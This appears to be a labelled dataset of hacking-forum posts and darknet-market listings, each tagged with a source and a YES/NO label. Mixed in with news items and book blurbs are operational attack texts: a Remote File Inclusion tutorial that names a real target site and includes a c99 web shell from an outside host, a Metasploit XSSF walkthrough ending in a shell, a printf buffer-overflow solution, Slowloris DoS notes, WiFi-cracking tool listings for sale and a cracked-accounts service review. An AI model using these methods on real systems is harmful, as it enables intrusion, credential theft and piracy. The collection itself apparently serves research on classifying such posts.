"  On Sunday, the 28th of November 2010 around 20:00 UTC the main <br>distribution server of the ProFTPD project was compromised. The <br>attackers most likely used an unpatched security issue in the FTP daemon <br>to gain access to the server and used their privileges to replace the <br>source files for ProFTPD 1.3.3c with a version which contained a backdoor. <br>The unauthorized modification of the source code was noticed by <br>Daniel Austin and relayed to the ProFTPD project by Jeroen Geilman on <br>Wednesday, December 1 and fixed shortly afterwards. <br> <br>The fact that the server acted as the main FTP site for the ProFTPD <br>project (ftp.proftpd.org) as well as the rsync distribution server <br>(rsync.proftpd.org) for all ProFTPD mirror servers means that anyone who <br>downloaded ProFTPD 1.3.3c from one of the official mirrors from 2010-11-28 <br>to 2010-12-02 will most likely be affected by the problem. <br> <br>The backdoor introduced by the attackers allows unauthenticated users <br>remote root access to systems which run the maliciously modified version <br>of the ProFTPD daemon. <br> <br>Run MD5 checksums to be on the safer side.",D4Garage4hackers,YES

"THE BEST PRO WIFI HACKING TOOLS PACK 2017  Here we figured out three tools of the set.<br>  <br> 1. Aircrack<br> Aircrack is one of the most popular wireless passwords cracking tools which you can use for 802.11a/b/g WEP and WPA cracking.<br> Aircrack uses the best algorithms to recover wireless passwords by capturing packets. Once enough packets have been gathered,<br> it tries to recover the password. To make the attack faster, it implements a standard FMS attack with some optimizations.<br> The company behind the tool also offers an online tutorial where you can learn how to install and use this tool to<br> crack wireless passwords. It comes as Linux distribution, Live CD and VMware image options. You can use any of these.<br> It supports most of the wireless adapters and is almost guaranteed to work. If you are using a Linux distribution,<br> the only drawback of the tool is that it requires deeper knowledge of Linux. If you are not comfortable with Linux,<br> you will find it hard to use this tool. In this case, try Live CD or VMWare image. VMWare Image needs less knowledge,<br> but it only works with a limited set of host OS, and only USB devices are supported.<br> Before you start using this too, confirm that the wireless card can inject packets. Then start WEP cracking.<br> Read the online tutorial on the website to know more about the tool. If you will follow steps properly,<br> you will end up getting success with this tool.<br>  <br> 2. AirSnort<br> AirSnort is another popular tool for decrypting WEP encryption on a wi-fi 802.11b network.<br> It is a free tool and comes with Linux and Windows platforms. This tool is no longer maintained,<br> but it is still available to download from Sourceforge. AirSnort works by passively monitoring transmissions and<br> computing encryption keys once it has enough packets received. This tool is simple to use. If you are interested,<br> you can try this tool to crack WEP passwords.<br>  <br> 3. Cain & Able<br> Cain & Able is a popular password cracking tool. This tool is developed to intercept network traffic and<br> then discover passwords by bruteforcing the password using cryptanalysis attack methods. It can also recover<br> wireless network keys by analyzing routing protocols. It you are trying to learn wireless security and password cracking,<br> you should once try this tool.<br>  <br> Aircrack-ng<br> AirJack<br> Airsnort<br> Cain & Abel<br> CommView<br> CowPatty<br> InSSIDer<br> Kismet<br> LibPcap,<br> NetStumbler<br> OpenSSL<br> TCPDump<br> WepAttack<br> WireShark<br> ZLib<br><br>We always care about the safety of our customers!!! <br>",D3DreamMarket,YES

"  Slowloris is a perl script written by RSnake which executes a Denial of Service Attack against Web Servers. This attack is performed at Layer 7 unlike the traditional Layer 4, DDoS attacks. There is no need for a Botnet in this case.  The script can be downloaded from here: http://ha.ckers.org/slowloris/slowloris.pl  It works, by sending partial HTTP Requests to the web server. It never sends the complete request, thereby blocking all the connections available to the Web Server.  Currently, there are a set of Web Servers which are known to be vulnerable to this type of Attack. You can find the complete list of vulnerable Web Servers on RSnake\'s site here: ha.ckers.org/slowloris/  I thought of testing it in my Lab.  Following was the setup used:  Ubuntu 11.04 running in a VM all the required perl libraries were installed on the VM.  Host OS: Windows 7 Home Premium, 64 bit. Firewall was disabled on the host.  Apache version 2.2.19 running on the Host OS.  I tried to perform a Denial of Service attack against the host OS, but for some reason it didn\'t work.  Sam Bowne has a complete set of instructions written in order to get this working, for me no success. Maybe, I will have to use a bigger html page instead of the default one which just displays the text, ""It Works!"".  You can find these instructions here: http://samsclass.info/seminars/DEFCO..._Slowloris.doc  Also, if you guys are aware of th3j3st33r who\'s busy attacking Jihadi Websites using his tool, XerXes, many hackers believe that his tool, XerXes, is a modified version of Slowloris with a frontend GUI.  In any case, first I need to get this script working in the labs. Later, we can improvise.  Regards, c0d3inj3cT",D4Garage4hackers,YES

All I see for reseting trial (soon to expire) programs are tools like RunAsDate, Trial-Reset, TimeStopper, etc but in my case the trial (limitation) of software is different and NOT time from installation based. My OS is Windows 8. I have a software where I am opening some executable file but it is in trial mode. Unfortunately the limitation is Not regular time period one such as ''You have X days left to try this software'' but the limitation is according to the quantity of times I run/open the software. I would need some advice for solution: To reset the counter of runs/openings of software (the executable file) so it would ''look like'' I have never runned the software yet and I would have maximum quantity of runs available. The tool could have special feature: The indicator of tracking/recording that I opened the file (therefore maximum allowed runs of executable file would decrease for one per each run) in the past must be PREVENTED from ever occurring again. It is completely irrelevant how/where/when the software shows how many runs I have left.

"Cross Site Scripting is a vulnerability in applications, which exists when it does not implement input validation mechanisms provided by users of the data to the application. There are cases where the validation is, however, is not sufficient or well implemented, thus allowing the ability to run scripts nobrowser user. Attacks that exploit this vulnerability, in most cases aimed at compromising the security of the user who uses the application, known as client-side attacks. These attacks include capture session cookies, user data, credentials, creating fake websites (phishing), among others. In Metasploit framework exists still in a testing stage called XSSF designed to facilitate the use of Cross Site Scripting, I performed some tests quite satisfactory, it was possible to get information from the user's browser to the exploitation of browser vulnerabilities to execute commands . To use the framework is necessary to download athttp: / / www.metasploit.com/redmine/attachments/596/XSSF.zip and extract the file into the directory of Metasploit. Having extracted the file, just run the Metasploit console and use the load command, as shown image. When running the XSSF enables a Web server containing a javascript code to be executed in browserda victim, so it generates a URL for use of social engineering, where the attacker must provide to the user. In this case the URL is generated: http://192.168.2.103:8888/loop. For demonstration purposes we used an XSS vulnerability found in web application Damn Vulnerable Web App (DVWA) injection and run the script. To verify that the code was executed on the user's browser, execute the command ""xssf_active_victms"" It was found that there is an active connection coming from the Internet Explorer browser with the command ""xssf_information"", you can get more information. The framework has some modules where you can interact with the browser attacked. In the pictures below you can check the use of auxiliary module / XSSF / alert. After running the module, you can check the user's browser window alert run. Well this way you can get other information such as session cookies, clipboard access and more. Given the existing level of interaction with the user's browser, you can still run exploits to exploit client-side vulnerabilities. To illustrate was fired at the user's browser ms10_046_shortcut_icon_dllloader the exploit. The images illustrate the configuration and execution of the exploit. Thus, it is possible to verify that the exploit was successful and returned to the attacker a shell to execute commands.

"CODING FREEDOM THE ETHICS AND AESTHETICS OF HACKIN Coding Freedom: The Ethics and Aesthetics of Hacking By E. Gabriella Coleman <br>2012 | 264 Pages | ISBN: 0691144613 , 0691144605 | EPUB | 2 MB <br><br><br>Who are computer hackers? What is free software? And what does the emergence of a community dedicated to the production of free and open source software--and to hacking as a technical, aesthetic, and moral project--reveal about the values of contemporary liberalism? Exploring the rise and political significance of the free and open source software (F/OSS) movement in the United States and Europe, Coding Freedom details the ethics behind hackers' devotion to F/OSS, the social codes that guide its production, and the political struggles through which hackers question the scope and direction of copyright and patent law. In telling the story of the F/OSS movement, the book unfolds a broader narrative involving computing, the politics of access, and intellectual property. <br><br>E. Gabriella Coleman tracks the ways in which hackers collaborate and examines passionate manifestos, hacker humor, free software project governance, and festive hacker conferences. Looking at the ways that hackers sustain their productive freedom, Coleman shows that these activists, driven by a commitment to their work, reformulate key ideals including free speech, transparency, and meritocracy, and refuse restrictive intellectual protections. Coleman demonstrates how hacking, so often marginalized or misunderstood, sheds light on the continuing relevance of liberalism in online collaboration. <br><br>Just extract the rar archive and enjoy it... <br>",D3DreamMarket,NO

"  Online criminals have evolved their tactics to harden their botnets against takedown using a variety of tactics, including fast-flux networks and Conficker-like dynamic domain generation. Yet, such tactics can also pinpoint when such networks are being created by bot operators, according to research from the Georgia Institute of Technology.  The research found that dynamically detecting changes in the domain name system (DNS) can lead to the early detection of botnets. When bot masters create the infrastructure for a botnet, the reputation of the domain names can tip off defenders. In two papers, one released last year (PDF) and one to be published in September, GATech researchers found that they can detect anomalies in the domain name system indicative of botnets and have documented recognition rates greater than 98 percent.  Monday, network security firm Damballa announced a service based on the research to provide intelligence on botnet-infected systems. Called FirstAlert, the service can detect the characteristic DNS queries indicative of botnet infections inside a customer\'s network.  Full Article",D4Garage4hackers,YES

In the early 1980s, she worked for Bob Woodward, first as his research assistant in the papers investigative unit and, later, as his personal researcher for Veil, his bestselling book about the CIA. Next she helped Carl Bernstein, who was struggling to finish his memoir, Loyalties. She then assisted legendary editor Ben Bradlee on his acclaimed autobiography A Good Life, and she worked with Hillary Clinton on her bestselling It Takes a Village. Feinman Todds involvement with Mrs. Clinton made headlines when the First Lady neglected to acknowledge her role in the books creation, and later, when a disclosure to Woodward about the Clinton White House appeared in one of his books. These events haunted Feinman Todd for the next two decades until she confronted her past and discovered something startling.<br><br>Revealing what its like to get into the heads and hearts of some of Washingtons most compelling and powerful figures, Feinman Todd offers authentic portraits that go beyond the carefully polished public personas that are the standard fare of the Washington publicity factory.

"  That PC keyboard you\'re using may be giving away your passwords. Researchers say they\'ve discovered new ways to read what you\'re typing by aiming special wireless or laser equipment at the keyboard or by simply plugging into a nearby electrical socket.  Two separate research teams, from the Ecole Polytechnique Federale de Lausanne and security consultancy Inverse Path have taken a close look at the electromagnetic radiation that is generated every time a computer keyboard is tapped. It turns out that this keystroke radiation is actually pretty easy to capture and decode -' + '- if you\'re a computer hacker-type, that is.  The Ecole Polytechnique team did its work over the air. Using an oscilloscope and an inexpensive wireless antenna, the team was able to pick up keystrokes from virtually any keyboard, including laptops. ""We discovered four different ways to recover the keystroke of a keyboard,"" said Matin Vuagnoux, a Ph.D. student at the university. With the keyboard\'s cabling and nearby power wires acting as antennas for these electromagnetic signals, the researchers were able to read keystrokes with 95 percent accuracy over a distance of up to 20 meters (22 yards), in ideal conditions.  Laptops were the hardest to read, because the cable between the keyboard and the PC is so short, making for a tiny antenna. The researchers found a way to sniff USB keyboards, but older PS/2 keyboards, which have ground wires that connect right into the electric grid, were the best.  Read more",D4Garage4hackers,YES

"  Are you done with the certification exam? I did OSCP back last year in October, since then they\'ve changed a lot of things for PWK from what I\'ve heard.  Just some points: 1. If you\'re stuck at a machine in the labs, focus on recon and info gathering. Google each and everything you find, if you\'re not familiar with it already. 2. Pain, sufferance, humble & gh0st are the best machines! 3. If an exploit doesn\'t get you a shell, look at the errors and just don\'t give it up after a go, you might need to fix up the exploit a bit before it runs correctly. 4. Practice BOF\'s on other applications as well, you can lookup exploits and apps both on EDB. Corelan.be is a very good resource for learning. 5. There are multiple attack vectors for each machine, so if one is failing, look up other ways to exploit it. 6. Try to be as less dependent on Metasploit as you can.  Lastly, keep calm and enjoy the labs cause you\'re gonna miss it when it gets over.  Cheers!",D4Garage4hackers,NO

"For a first time VIP subscriber (taken a 1 month sub to test the water, so to speak) I can honestly say it is money well spent. Just one of the accounts i got would have cost me more than the month's sub alone to buy from elsewhere. Loads of accounts available if you like music sub services, file hosting, tv/film services, VPN, even book reading subscriptions! Very wide selection. I'm not overly fussed about the adult sections but there are a wealth of quality passes available. The staff seem to go above and beyond the call of duty, very friendly and will always offer help and guidance where they can. There is a tool and configs section to help you get your own accounts, proxies etc although I just can't wrap my head around using Sentry MBA yet! I'll get there one day.. There is a request section (3 per week limit!) which mainly seems to consist of people wanting adult passes. These type of requests tend to be fulfilled quickly. I have 3 requests in and I'm still awaiting confirmation of whether they are possible or not, but I am patient (patience is a MUST as different services take longer to crack). One thing I think would be helpful is if a cracker/staff member is having a go at your request it would be helpful if they could add a note to it to let you know it's not being ignore and is being checked out. That way it would prevent 'thread bumping'. All in all I'd say give it a go people, try it for a month and I guarantee that you'll get more than your money's worth of value out of that section. Have a look around, join in the VIP discussion area, READ THE RULES and everything will go smoothly.

"d4rkpr1nc3, Shellcode is nothing but set of machine instructions which you normally write so that when you gain control over vulnerable program that program will redirect EIP to the shellcode(basically instructions written by author to do something) and then those instructions will get executed instead of actual program code. for eg. lets say your computer is having Winamp installed which is vulnerable. now did you seen any option in winamp to launce calc.exe?? NO but as the winamp is vulnerable, so what you can do is create exploit in which you will insert shellcode which is nothing but instructions to execute calc.exe so when you use this exploit what it will do is copy your shellcode somewhere in memory then control your program(winamp) and ask it to jump on a memory location where your shellcode is placed so once it take jump to your shellcode it get executed and you see calc.exe running on your computer. hope this cleared your doubt if not then feel free to ask your doubt again.",D4Garage4hackers,YES

"HACK Any WiFi Network  ULTIMATE WIFI HACKER Chances are you have a Wi-Fi network at home, or live close to one (or more) that tantalizingly pop up in a list whenever you boot up the laptop.<br><br>The problem is, if there's a lock next to the network name (the SSID, or service set identifier), that indicates security is turned on. Without the password or passphrase, you're not going to get access to that network, or the sweet, sweet internet that goes with it. <br><br>Well with this software you will be able to access ANY WiFi network you want!<br><br>============================================================================<br><br>1. Aircrack <br>Aircrack is one of the most popular wireless passwords cracking tools which you can use for 802.11a/b/g WEP and WPA cracking. Aircrack uses the best algorithms to recover wireless passwords by capturing packets. Once enough packets have been gathered, it tries to recover the password. To make the attack faster, it implements a standard FMS attack with some optimizations. <br>The company behind the tool also offers an online tutorial where you can learn how to install and use this tool to crack wireless passwords. It comes as Linux distribution, Live CD and VMware image options. You can use any of these. It supports most of the wireless adapters and is almost guaranteed to work. If you are using a Linux distribution, the only drawback of the tool is that it requires deeper knowledge of Linux. If you are not comfortable with Linux, you will find it hard to use this tool. In this case, try Live CD or VMWare image. VMWare Image needs less knowledge, but it only works with a limited set of host OS, and only USB devices are supported. <br>Before you start using this too, confirm that the wireless card can inject packets. Then start WEP cracking. Read the online tutorial on the website to know more about the tool. If you will follow steps properly, you will end up getting success with this tool. <br><br>2. AirSnort <br>AirSnort is another popular tool for decrypting WEP encryption on a wi-fi 802.11b network. It is a free tool and comes with Linux and Windows platforms. This tool is no longer maintained, but it is still available to download from Sourceforge. AirSnort works by passively monitoring transmissions and computing encryption keys once it has enough packets received. This tool is simple to use. If you are interested, you can try this tool to crack WEP passwords. <br><br>3. Cain & Able <br>Cain & Able is a popular password cracking tool. This tool is developed to intercept network traffic and then discover passwords by bruteforcing the password using cryptanalysis attack methods. It can also recover wireless network keys by analyzing routing protocols. It you are trying to learn wireless security and password cracking, you should once try this tool. <br><br>4. Kismet <br>Kismet is the wi-fi 802.11 a/b/g/n layer2 wireless network sniffer and IDS. It works with any wi-fi.<br><br><br>============================================================================<br><br>DOWNLOAD LINKS WILL BE PROVIDED WITHIN 24 HOUSR OF PURCHASE  <br>",D3DreamMarket,YES

"  A German power utility specialising in renewable energy was hit by a serious cyber-attack two weeks ago that lasted five days, knocking its internet communications systems offline, in the first confirmed digital assault against a European grid operator.ÂIt was a DOS (ÂDenial Of ServiceÂ) attack with a botnet behind it,Â Boris Schucht, the CEO of 50Hertz told EurActiv on the fringes of a Brussels renewables conference. ÂIt blocked our internet domains so that in the first hours, all email and connectivity via the internet was blocked.Â DOS attacks involve thousands of requests being sent to a server each second to clog up a systemÂs functioning. Electricity supplies were not affected in the onslaught, which was Âserious but not dangerous,Â Schucht said. Email services were quickly repaired, although a fix to the problem was only discovered five days later.  Source: European renewable power grid rocked by cyber-attack | EurActiv",D4Garage4hackers,YES
"Note that there are several possibilities to implement this, so this is really just one example. This is how it works in general: The customer who buys your software tells you the username to license the software with. Upon paying for the software, he will get: the software itself that has a personal serial number and an activation key The activation key is generated from the username and the serial number. You may also include more information as you like, including hardware information which will limit the use of the software to a certain device (caution here, it may piss off the users if the software doesn't work anymore after a hardware update). You put this into a hashing algorithm and thus get the activation key. Example: You do not have sufficient rights to see the hidden data contained here. The customer starts your program and is asked for username and activation key. He enters it and the program will verify the activation key by comparing it with the hash it generates from the username and the serial. If both are the same, the software will run properly. The license information is saved subsequently in the app data directory, so the user only has to input his key once. Example GUI program with source zip file attached You do not have sufficient rights to see the hidden data contained here. Here is also valid username-key-pair example for testing: username: test activation key: ec80b8ca371d17aaa5361d811f8bc7a3f4207134af3dc70dbb ac102592a91533 Source: You do not have sufficient rights to see the hidden data contained here. FAQ Is this safe? No licensing system is safe. What can I do to make it more safe? Use obfuscation and other anti-reversing techniques, i.e. You do not have sufficient rights to see the hidden data contained here. Try not to annoy the customer who was so kind to buy your software with protection techniques. Rather make the software so great that people want to pay for it in order to support it!",D1CrackingArena,YES

"  Source <br> <br>VANCOUVER â Using three different vulnerabilities and clever exploitation techniques, Irish security researcher Stephen Fewer successfully hacked into a 64-bit Windows 7 (SP1) running Internet Explorer 8 to win this yearâs CanSecWest hacker challenge. <br> <br>Fewer, a Metasploit developer who specializes in writing Windows exploits, used two different zero-day bugs in IE to get reliable code execution and then chained a third vulnerability to jump out of the IE Protected Mode sandbox. <br> <br>The attack successfully bypassed DEP (data execution prevention) and ASLR (address space layout randomization), two key protection mechanisms built into the newest versions of Windows. <br> <br>âI had to chain multiple vulnerabilities to get it to work reliably,â Fewer said in an interview.",D4Garage4hackers,YES

"Remote File Inclusion (RFI) is a type of vulnerability most often found on websites. It allows an attacker to include a remote file, usually through a script on the web server. The vulnerability occurs due to the use of user-supplied input without proper validation. This can lead to something as minimal as outputting the contents of the file, but depending on the severity, to list a few it can lead to: Code execution on the web server Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS). Denial of Service (DoS) Data Theft/Manipulation Lets Start 1st Step : Find a Vunerable websites using Google Dork some dork for searching a RFI Vuln website âinurl:index.php?page=â its Most Popular Dork of RFI hacking This will show all the pages which has âindex.php?page=â in their URL, Now to test whether the website is vulnerable to Remote file Inclusion or not the hacker use the following command www.targetsite.com/index.php?page=www.google.com see example of this website http://www.cbspk.com So the hacker url will become http://www.cbspk.com/v2/index.php?page=http://www.google.com If after executing the command the homepage of the google shows up then then the website is vulnerable to this attack if it does not come up then you should look for a new target. In my case after executing the above command in the address bar Google homepage shows up indicating that the website is vulnerable to this attack. Now the hacker would upload the shells to gain access. The most common shells used are c99 shell or r57 shell. I would use c99 shell. You can download c99 shell from the link below: http://www.sh3ll.org/c99.zip The hacker would first upload the shells to a webhosting site such as ripway.com, viralhosts.com,110mb.com or another free hosts etc. Now here is how a hacker would execute the shells to gain access. Lets say that the url of the shell is http://www.sh3ll.org/c99.txt? Now here is how a hacker would execute the following command to gain access http://www.cbspk.com/v2/index.php?page=http://www.sh3ll.org/c99.txt? Don't Forget To add â?â after .txt at the end of url or else the shell will not execute.

"  We will start with the JS Deobfuscation.  I will at first pick the second malicious JS sent to us in the response. However, I will not mention the details and instead put the link to my paper on exploit-db which discusses about this JS.  Open the PDF from here: http://www.exploit-db.com/wp-content...docs/18746.pdf  Go to Page 12 and start following from there.  I have discussed the various tricks and techniques used by the obfuscator. It also presents a manual approach to deobfuscate the code efficiently.  To summarize it, you need to extract the decoding logic from the obfuscated JS and create a new HTML page. Put the obfuscated chunk of JS in it followed by the decoding logic and let it tell you the result.  There were 2 layers of obfuscation and the resulting HTML page was exploiting the CVE-2010-1885  I have put almost all the details there to deobfuscate it so I am not covering them once again here.

"  I would like to add one more attack that is Unnamed Attack. It works similar to teardrop attack. But in case of Unnamed attack a gap is created in packet size rather than overlapping packet size in teardrop. eg:  Unnamed attack: Let total size of packet is 7000 bytes. So to perform Unnamed attack : first packet size is 1 - 1500 bytes second packet size is 1501- 3000 bytes third packet size is 3001 - 4500 bytes fourth packet size is 6001 - 7000 bytes  the expected size of fourth size was 4501 -6000 bytes.

  I think you are trying to put words in my mouth. Just because I said I have found many which ARE running as root does not mean I have not found others which are not or which are chrooted. That is called conjecture. I have found many which are - a simple statement which does not need to be attacked. I had two customers in last 6 months who were compromised from leaving admin pages open with default creds and attackers uploading backdoor shells. They both ran with high level privileges. <br> <br>My point is the intial question is phrased incorrectly as he mixes the user of a connect back shell and having a web user account.

"  Hi, I need help about sending mail in linux. I have a ubuntu server with working web site, users are uploading files in one main directory (to folder inbox). With samba I shared that directory and on other mashine is Windows server and application that is reading that files and writting content to database. Based of the result is creating new file with content: package name that is recieved, size, date and time and does the package contained erros or it was OK. That newly created files are again sent over samba to the same directory in ubuntu server (to folder outbox). That all is working!  Now, i need to listen are there new files in folder outbox. If there are new files, I need to send their content to specific email address. I have users in Mysql database. The name of files that are coming to outbox is with mask like this ddmmyyyy.x where x is user id in Mysql. So if ""extension"" of file is 1, I need to send mail to mail address of user in mysql with user id 1. If its 2 I am sending to user with user id... and after that move file from outbox to archive.  So, it\'s going like this: new file arrived in outbox, based on the extension of that file, select email address of user from database with user id = extension of file. On that email address send content of that file and move file to archive.  Does anyone can help me to solve this. Thank you!

"  DNS rebinding is a vulnerability in Web browsers and their plug-ins that can be exploited to circumvent firewalls or to temporarily hijack a client\'s IP address, effectively converting browsers into open network proxies. Users rely on their Web browsers to isolate sites they visit using the same origin policy: one site should be able to read and write data only from itself. DNS rebinding vulnerabilities permit an attacker to confuse a Web browser into aggregating a target server into his or her origin, allowing the attacker to communicate with that server through the browser.  These attacks work because browsers and plug-ins use DNS host names to distinguish between different origins, but browsers don\'t actually communicate with the hosts by name: they must first use DNS to resolve the host name to an IP address and then communicate with the host by its IP address. Consider a host name, such as attacker.com, that is first bound to the attacker\'s Web server. The attacker can load JavaScript, Flash, or other active content into the attacker.com origin in the browser. If the attacker then rebinds attacker.com to point to the target\'s Web server, that active content can now read and write on sockets to the target server.",D4Garage4hackers,YES

Ok the solution is as follows ...  Ideally it will take 24 bytes to overflow the flag variable. Now the thing that may confuse you is the \\x00 byte which is the string terminator.. But gets() doesnt consider \\x00 as the string terminator, it considers \<br>(\\xa) as the string terminator.. So all you need to give is 20 bytes of junk + 0x41420043 in little endian format  Like this... assume the program object file is named test...  then , $printf ""%020x\\x43\\x00\\x42\\x41"" | test you win $ Hope you enjoyed this...

"  That PC keyboard you\'re using may be giving away your passwords. Researchers say they\'ve discovered new ways to read what you\'re typing by aiming special wireless or laser equipment at the keyboard or by simply plugging into a nearby electrical socket.  Two separate research teams, from the Ecole Polytechnique Federale de Lausanne and security consultancy Inverse Path have taken a close look at the electromagnetic radiation that is generated every time a computer keyboard is tapped. It turns out that this keystroke radiation is actually pretty easy to capture and decode -' + '- if you\'re a computer hacker-type, that is.  The Ecole Polytechnique team did its work over the air. Using an oscilloscope and an inexpensive wireless antenna, the team was able to pick up keystrokes from virtually any keyboard, including laptops. ""We discovered four different ways to recover the keystroke of a keyboard,"" said Matin Vuagnoux, a Ph.D. student at the university. With the keyboard\'s cabling and nearby power wires acting as antennas for these electromagnetic signals, the researchers were able to read keystrokes with 95 percent accuracy over a distance of up to 20 meters (22 yards), in ideal conditions.  Laptops were the hardest to read, because the cable between the keyboard and the PC is so short, making for a tiny antenna. The researchers found a way to sniff USB keyboards, but older PS/2 keyboards, which have ground wires that connect right into the electric grid, were the best.  Read more",D4Garage4hackers,YES

However, for this script it suffecient, for test command used, but remember if you are opting only one argument with the script, force/limit the user to use only one argument. You will find how important it is in your further learnings when you using multiple arguments. I mean,   PHP Code: <br>if [ ! $# == 1 ]\r then\r echo ""Usage: $0 [ File-Name ]""\r exit 1\r fi \r <br><br>It forces/limits the user for only one argument.       if [ ""$EXT"" = ""cpp"" ] ; then #Determing whether it\'s C or C++ by file extension  DIR=\'usr/include/c++/4.6.3/default.htm\' #C++ include directory  elif [ ""$EXT"" = ""c"" ] ; then  DIR=\'usr/include/default.htm\'   2. Small Mistake, which actually most of the new bash script learners does. Consider even I pass the right argument, as ""somefile.cpp"" file, your script never works for me. Why? because, your variable ""DIR"" fails, because, I don\'t have ""4.6.3"" directory. I have ""4.7"" version, so do I have directory ""4.7"" at ""/usr/include/c++"".

Click on ""HTTP Header"" tab: site is pop-up so we will use GET method You do not have sufficient rights to see the hidden data contained here. ""Proxy Settings"" tab - just leave it as it is, click on the next tab ""Fake Settings"" and make sure you ticked ""Follow Redirects"": You do not have sufficient rights to see the hidden data contained here.

"Resistive Random Access Memory RRAM 2016 RRAM technology has made significant progress in the past decade as a competitive candidate for the next generation non-volatile memory (NVM). This lecture is a comprehensive tutorial of metal oxide-based RRAM technology from device fabrication to array architecture design. State-of-the-art RRAM device performances, characterization, and modeling techniques are summarized, and the design considerations of the RRAM integration to large-scale array with peripheral circuits are discussed. Chapter 2 introduces the RRAM device fabrication techniques and methods to eliminate the forming process, and will show its scalability down to sub-10 nm regime. Then the device performances such as programming speed, variability control, and multi-level operation are presented, and finally the reliability issues such as cycling endurance and data retention are discussed. Chapter 3 discusses the RRAM physical mechanism, and the materials characterization techniques to observe the conductive filaments and the electrical characterization techniques to study the electronic conduction processes. It also presents the numerical device modeling techniques for simulating the evolution of the conductive filaments as well as the compact device modeling techniques for circuit-level design. Chapter 4 discusses the two common RRAM array architectures for large-scale integration: one-transistor-one-resistor (1T1R) and cross-point architecture with selector. The write/read schemes are presented and the peripheral circuitry design considerations are discussed. Finally, a 3D integration approach is introduced for building ultra-high density RRAM array. Chapter 5 is a brief summary and will give an outlook for RRAM's potential novel applications beyond the NVM applications.<br><br>Format: PDF <br>",D3DreamMarket,NO

  I have a doubt. Once we figure out that a web page can be rendered transparent in an iframe. What do we do -' + '-  1. Design a attack site with dummy button and put this transparent iframe on top of that. So the user clicks and hits the iframe. 2. Design a attack site with dummy button and put the transparent iframe below the dummy button. In this case how does that work ?

"  According to a news published at H-online, IT Security specialist Daniel Garcia has released a new tool which is capable of launching attacks against home networking devices that support Universal Plug and Play (UPnP) on their interfaces. He disclosed that the entire series of routers, cable modems and other networking devices from big manufacturers are vulnerable to UPnP attacks over the Internet. The UPnP was discovered by Microsoft which allows applications to discover network gateways automatically and ask them to forward traffic on special ports back to the computers they are running on. <br> <br>Umap, the tool he made while researching, detects UPnP-enabled end devices such as DSL routers and cable modems on the internet by directly retrieving the devicesâ XML descriptions. The required URLs and ports for some models are hard-coded into the tool. This enables the software to bypass the usual restriction that only allows UPnP to search for compatible hardware via multicast in local networks. Garcia says that entire device series by Edimax, Linksys, Sitecom or Thomson ( respond to UPnP requests on their WAN interfaces as reported in the blog. He claims to have identified over 150,000 potentially vulnerable devices in a short period of time by using Umap. The scanner is also capable of sending requests containing AddPortMapping or DeletePortMapping commands to the exposed UPnP interfaces. <br> <br>Some protection measures that can be taken is to disable WAN UPnP access if possible from the routerâs administration interface, or finally replace the device with one that doesnât have this feature! <br> <br>Source",D4Garage4hackers,YES

Encounter in the Pleiades is the story of a man who was taken to the Pleiades and given a scientific education far beyond the horizons of anything taught in universities. For the first time, the personal history of Preston Nichols is revealed along with an avalanche of amazing information the world has not yet heard. A new look at Einstein gives insights into the history of physics and how the speed of light can be surpassed through the principles of reality engineering. New concepts in science are offered with technical but simple descriptions even the layman can understand. These include the creation of alternate realities through the use of twisters and spinners; mind control aspects of the Star Wars defence system; implants; alien abductions and much more. Peter Moon adds further intrigue to the mix by divulging his part in a bizarre project which led him to Preston Nichols and the consequent release of information.His account of the role of the Pleiades in ancient mythology sheds new light on the current predicament of Mankind and offers a path of hope for the future. <br>",D3DreamMarket,NO

"Learn WPF MVVM XAML C sharp and the MVVM Pattern 2 You're a developer who knows nothing to WPF. Which is fine, except that you need to start coding your next application using WPF and the MVVM pattern. Don't worry: I have you covered. I've been training hundreds of developers like you during 15 years, and converted my experience into this book. I know from experience teaching what takes more time to learn in WPF, and will spend time only where appropriate. Plus this book is packed with exercises which build up into a full project: you develop a small e-commerce sample application. You'll allow users to browse for products, and you'll also create a back-end where users will be able to list and edit products.

"  Security experts at CSIS say that they have discovered the smallest online banking trojan yet. Called Tiny Banker (Tinba), the malware is just barely 20KB in size, including its configuration files.  Like Zeus, Tinba uses man-in-the-browser techniques and easily extendable configuration files to manipulate bank web sites via webinjects. Webinjects can be used, for example, to create additional fields for numerical single-use passwords that the attackers can then leverage to authorise fraudulent payments. Tinba can also uncover standard passwords and monitor network traffic.  Tinba is a bot in the classical sense; it uses an encoded connection to deliver data it has collected to a command and control server, which in turn gives the bot new orders. According to CSIS, Tinba has only been used on a very small number of banking web sites so far, but its modular structure means that the perpetrators should not have any problems adding other sites to that list.

"  Android Forensics by Andrew Hoog. Due to the nature of Android and the author\'s experience with it, this book has a lot of great content.  My only real concern with this book is that it might lack the focus required by a normal investigator. I\'m sure many investigators simply want to know where to find key data (email, Web history, etc.) and then retrieve and analyze it in a forensically sound manner. It\'s the ""so what"" question that hangs over many forensics books. I would have liked a case study focusing on that sort of material to show how an investigator would make sense of the data and structures unearthed by the author throughout the book.  - Original Info by Richard Bejtlich",D4Garage4hackers,NO

"  Well, let me clear few things here. Once we figure out that a web page can be rendered in a transparent iframe, we need to look for one-click actions (button/link) which when clicked, will perform specific action. <br> <br>Let\'s assume that we have a button. So we need to ""Design a attack site, render vulnerable page in transparent iframe and place a dummy button on top of the button from iframe. So when user sees the page, it see the dummy button and when clicked, it\'s actually clicking the button from iframe. This happens because there is no action on the dummy button. If you put any action/event on the dummy button, it\'ll get executed when clicked.

"In Brief: Sony is finally bolstering the security of the PlayStation Network by adding Two-Factor Authentication to the servers â almost five years after a massive hack that exposed data of over 77 Million users.Sony confirmed to Polygon today that it is planning to introduce two-factor verification to its PlayStation Network widely soon after a Twitter user saw a reference to it in the latest 4.80 firmware update for the PlayStation 3. Although there is no official announcement from the company revealing when two-step authentication will be implemented in PSN, the representative told sources that ""more details will be shared at a later date."" Microsoft has been providing two-step verification to its Xbox Live users since 2013. The feature is also used on Battle.net and Steam. Two-Factor authentication, also known as two-step verification, is a process that requires you to submit two different forms of verification when logging into a service: One is your Password, and the other is a One-Time-Passcode often generated by a mobile app or received via text message on your smartphone. Though two-factor authentication doesn't give 100 percent guarantee of protecting your online accounts, it makes much harder for hackers and cyber criminals to gain access to your accounts. The 2011 PlayStation hack exposed the personal information of the entire PSN user base at the time (over 77 Million), including users account names, date of births, email addresses, and credit card details. The incident was the largest identity theft on record, which forced the company to shut down its entire system for almost a month. The hacktivist collective Anonymous took the responsibility for the breach. Moreover, the 2014 Sony Pictures Entertainment hack was also severe that led to the breach of Sony's private servers, the leak of the unreleased movie ""The Interview"" and a massive trove of employees' 